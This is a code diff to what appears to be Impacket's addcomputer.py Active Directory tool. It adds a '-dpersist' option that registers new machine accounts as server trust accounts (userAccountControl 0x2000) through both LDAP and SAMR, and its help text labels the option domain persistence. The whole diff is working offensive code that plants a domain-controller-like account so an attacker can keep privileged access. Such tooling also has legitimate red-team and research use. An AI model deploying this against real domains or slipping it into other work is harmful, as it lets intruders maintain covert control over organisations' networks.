@@ -60,6 +60,7 @@ class ADDCOMPUTER:
         self.__computerName = cmdLineOptions.computer_name
         self.__computerPassword = cmdLineOptions.computer_pass
         self.__method = cmdLineOptions.method
+        self.__dpersist = cmdLineOptions.dpersist
         self.__port = cmdLineOptions.port
         self.__domainNetbios = cmdLineOptions.domain_netbios
         self.__noAdd = cmdLineOptions.no_add
@@ -228,12 +229,16 @@ class ADDCOMPUTER:
                 ]
                 ucd = {
                     'dnsHostName': '%s.%s' % (computerHostname, self.__domain),
+                    #0x1000 = 4096 = normal computer account
+                    #0x2000 = 8192 = server trust account
                     'userAccountControl': 0x1000,
                     'servicePrincipalName': spns,
                     'sAMAccountName': self.__computerName,
                     'unicodePwd': ('"%s"' % self.__computerPassword).encode('utf-16-le')
                 }
-
+                if self.__dpersist == True:
+                    ucd['userAccountControl'] = 0x2000
+                    
                 res = ldapConn.add(computerDn, ['top','person','organizationalPerson','user','computer'], ucd)
                 if not res:
                     if ldapConn.result['result'] == ldap3.core.results.RESULT_UNWILLING_TO_PERFORM:
@@ -515,7 +520,10 @@ class ADDCOMPUTER:
                                 raise
 
                 try:
-                    createUser = samr.hSamrCreateUser2InDomain(dce, domainHandle, self.__computerName, samr.USER_WORKSTATION_TRUST_ACCOUNT, samr.USER_FORCE_PASSWORD_CHANGE,)
+                    if self.__dpersist == True:
+                        createUser = samr.hSamrCreateUser2InDomain(dce, domainHandle, self.__computerName, samr.USER_SERVER_TRUST_ACCOUNT, samr.USER_FORCE_PASSWORD_CHANGE,)
+                    else:
+                        createUser = samr.hSamrCreateUser2InDomain(dce, domainHandle, self.__computerName, samr.USER_WORKSTATION_TRUST_ACCOUNT, samr.USER_FORCE_PASSWORD_CHANGE,)
                 except samr.DCERPCSessionError as e:
                     if e.error_code == 0xc0000022:
                         raise Exception("User %s doesn't have right to create a machine account!" % self.__username)
@@ -541,7 +549,10 @@ class ADDCOMPUTER:
                     userHandle = openUser['UserHandle']
                     req = samr.SAMPR_USER_INFO_BUFFER()
                     req['tag'] = samr.USER_INFORMATION_CLASS.UserControlInformation
-                    req['Control']['UserAccountControl'] = samr.USER_WORKSTATION_TRUST_ACCOUNT
+                    if self.__dpersist == True:
+                        req['Control']['UserAccountControl'] = samr.USER_SERVER_TRUST_ACCOUNT
+                    else:
+                        req['Control']['UserAccountControl'] = samr.USER_WORKSTATION_TRUST_ACCOUNT
                     samr.hSamrSetInformationUser2(dce, userHandle, req)
                     logging.info("Successfully added machine account %s with password %s." % (self.__computerName, self.__computerPassword))
 
@@ -590,7 +601,7 @@ if __name__ == '__main__':
                                                                                 'SAMR works over SMB.'
                                                                                 'LDAPS has some certificate requirements'
                                                                                 'and isn\'t always available.')
-
+    parser.add_argument('-dpersist', action='store_true', help='Add computer account for domain persistence. Required domain admin privileges.')
 
     parser.add_argument('-port', type=int, choices=[139, 445, 636],
                        help='Destination port to connect to. SAMR defaults to 445, LDAPS to 636.')
